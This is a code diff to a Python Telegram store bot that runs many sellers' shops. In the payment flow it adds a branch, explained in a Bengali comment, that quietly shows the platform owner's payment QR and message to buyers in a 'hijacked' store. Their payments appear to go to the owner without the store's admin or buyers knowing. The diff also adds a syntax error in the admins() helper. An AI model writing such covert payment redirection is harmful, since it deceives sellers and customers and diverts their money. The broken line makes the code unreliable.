@@ -14,7 +14,7 @@ TOKEN          = os.environ.get('BOT_TOKEN')
 OWNER_ID       = int(os.environ.get('OWNER_ID', '0'))
 LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', '0'))
 
-bot = telebot.TeleBot(TOKEN)
+bot = telebot.TeleBot(TOKEN, parse_mode=None)
 app = Flask(__name__)
 
 IST = pytz.timezone('Asia/Kolkata')
@@ -449,7 +449,8 @@ def handle_callbacks(call):
         target_store, is_hijacked = get_effective_store(s_uid, uid)
         if not target_store: return
         
-        if is_hijacked and target_store.get("hijack_override", {}).get("enabled", False):
+        has_override = is_hijacked and target_store.get("hijack_override", {}).get("enabled", False)
+        if has_override:
             products = target_store["hijack_override"].get("products", [])
         else:
             products = target_store.get("products", [])
@@ -464,12 +465,18 @@ def handle_callbacks(call):
         mk.row(InlineKeyboardButton("I have paid ✅", callback_data=f"paid_{s_uid}_{pid}"))
         mk.row(InlineKeyboardButton("Back 🔙", callback_data="back_home"))
         
-        if is_hijacked and target_store.get("hijack_override", {}).get("enabled", False):
+        if has_override:
             pay_msg = target_store["hijack_override"].get("payment_msg") or target_store.get("payment_msg", DEFAULT_PAY_MSG)
             pay_photo = target_store["hijack_override"].get("payment_photo") or target_store.get("payment_photo", "")
         else:
-            pay_msg = prod.get("pay_msg") or target_store.get("payment_msg", DEFAULT_PAY_MSG)
-            pay_photo = target_store.get("payment_photo", "")
+            if is_hijacked:
+                # যদি হাইজ্যাক হয়ে থাকে এবং ওভাররাইড না থাকে, তবে মূল মালিকের (Owner) পেমেন্ট QR ও মেসেজ দেখাবে
+                owner_store = get_store(OWNER_ID)
+                pay_msg = prod.get("pay_msg") or (owner_store.get("payment_msg") if owner_store else DEFAULT_PAY_MSG)
+                pay_photo = owner_store.get("payment_photo", "") if owner_store else ""
+            else:
+                pay_msg = prod.get("pay_msg") or target_store.get("payment_msg", DEFAULT_PAY_MSG)
+                pay_photo = target_store.get("payment_photo", "")
 
         full = f"{caption}\n\n{pay_msg}"
         if pay_photo:
@@ -503,7 +510,7 @@ def _owner_handle(call):
     data = call.data
 
     def admins():
-        return [x for x in DB_STATE["stores"].values() if x.get("role") == "admin"]
+        return [x for x in DB_STATE["stores"].values() if x.get("role"] == "admin"]
 
 
     if data == "own_hijack_menu":
@@ -1091,7 +1098,8 @@ def handle_all_inputs(message):
             user_states.pop(uid, None)
             bot.send_message(uid, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁.... 𝗪𝗮𝗶𝘁 5-𝟭𝟬 𝗺𝗶𝗻.")
             
-            if is_hijacked and sr.get("hijack_override", {}).get("enabled", False):
+            has_ov = is_hijacked and sr.get("hijack_override", {}).get("enabled", False)
+            if has_ov:
                 prod = next((p for p in sr["hijack_override"].get("products", []) if p["id"] == pid), None)
             else:
                 prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
@@ -1357,7 +1365,12 @@ def home():
     return "Multi-Admin Telegram Store Bot is running!"
 
 def run_bot():
-    bot.infinity_polling()
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=60)
+        except Exception as e:
+            print("Polling Error:", e)
+            time.sleep(3)
 
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
